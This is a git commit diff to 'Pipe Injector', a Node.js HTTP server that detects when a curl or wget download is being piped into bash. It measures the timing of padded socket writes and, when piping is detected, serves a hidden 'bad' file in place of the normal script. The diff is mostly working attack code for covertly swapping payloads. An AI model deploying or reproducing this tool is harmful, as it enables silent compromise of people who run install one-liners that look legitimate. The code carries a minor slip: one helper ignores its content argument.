30f8f4028b1326404dc126d548cbe5a6f280b2e7
Myles Johnson <myles.s.johnson@gmail.com>
2017-02-15 16:19:11 -0500

    Update to make it much more reliable.

--- README.md
+++ README.md
@@ -2,13 +2,18 @@ Pipe Injector
 =============
 Node.js script that can detect when "curl ... | bash" is being used and serve a different file than normal. This is an implementation of this article https://www.idontplaydarts.com/2016/04/detecting-curl-pipe-bash-server-side/
 
+Requirements
+------------
+* Node.js v8 or Node.js v7 using the [harmony flag](https://nodejs.org/en/docs/es6/).
+
 Usage
 -----
 The first 4 lines of injector.js are the settings used to configure the program:
-* initalFile is the file sent regardless of good or bad. It must be set to a file in it that has at least a `sleep` inside. I've found 3 seconds to work, but other delays may be necessary.
+* initalFile is the file sent regardless of good or bad. It must be set to a file in it that has at least a `sleep` inside. I've found 2 seconds to work, but other delays may be necessary.
 * goodFile is the file served if piping is not detected.
 * badFile is the file served if piping is detected.
 * Port is what port number to bind the HTTP server on
+* minStd is the minimum standard deviation of the time needed to send each "filler" packet required to send badFile
 
 Warning
 -------
--- injector.js
+++ injector.js
@@ -2,49 +2,72 @@ const initalFile = "myinitialfile";
 	  goodFile = "myfile";
 	  badFile = "mybadfile";
 	  port = 8080;
+	  minStd = 500;
 
 const http = require('http'),
 	  fs = require('fs');
 
-function handleRequest(request, response){
+http.ServerResponse.prototype.writeFile = function(file) {
+	// Read a file and send it over http.
+	this.write(fs.readFileSync(file));
+	// Pipe makes weird things happen, I dunno why.
+    //var readStream = fs.createReadStream(file);
+    //readStream.pipe(this);
+}
+
+function responseWritePromise(response, contents) {
+	// Waits until the buffer is drained to resolve the promise.
+	return new Promise(resolve => {
+		response.write(padding, null, () => {resolve(true)});
+	});
+}
+
+function standardDeviation(values){
+	const avg = average(values);
+
+	const squareDiffs = values.map(value => {
+		return Math.pow(value - avg, 2);
+	});
+
+	return Math.sqrt(average(squareDiffs));
+}
+
+// Lifted from Abdennour TOUMI
+const average = arr => arr.reduce( ( p, c ) => p + c, 0 ) / arr.length;
+
+async function handleRequest(request, response){
 	// Don't even bother testing if it's being piped if the Useragent isn't curl/Wget
-	const ua = request.headers['user-agent']
+	const ua = request.headers['user-agent'];
 	if(!(ua.includes("Wget") || ua.includes("curl"))) {
-		var stream = fs.createReadStream(goodFile);
-		stream.pipe(response);
+		response.writeFile(goodFile);
 		console.log("Not curl/wget, Good Sent");
 		return;
 	}
 
 	// Send the inital base file that contains a delay.
-	// Strange bug occurs when you leave it as a buffer, not entirely sure why
-	const inital = fs.readFileSync(initalFile).toString();
-	response.write(inital);
+	response.writeFile(initalFile);
 
 	// Send padding to the client to try to fill their recieving socket buffer.
-	// This will cause the server side socket buffer to fill, which we detect.
-	var bash = false;
-	for (var i = 0; i < 40; i++) {
-		response.write(padding);
-		if(request.socket.bufferSize > 0) {
-			bash = true;
-			break;
-		}
+	// Record how many ms since "start" it took for the chunk to send.
+	const sTime = new Date();
+	var times = [];
+	for (var i = 0; i < 10; i++) {
+		await responseWritePromise(response, padding);
+		times.push(new Date() - sTime);
 	}
 
-	// If our buffer filled, we know they're piping it into bash, send the bad payload
-	if(bash) {
-		var stream = fs.createReadStream(badFile);
-		stream.pipe(response);
+	// If the std was high, we know there was a "jump" in send time. So we send the bad payload
+	if(standardDeviation(times) > minStd) {
+		response.writeFile(badFile);
 		console.log("Bad Sent");
 	} else {
-		var stream = fs.createReadStream(goodFile);
-		stream.pipe(response);
+		response.writeFile(goodFile);
 		console.log("Good Sent");
 	}
+	response.end();
 }
 
-const padding = '\0'.repeat(87380);
+const padding = Buffer.alloc(87380);
 http.createServer(handleRequest).listen(port, function() {
 	console.log("Server started on port " + port);
 });
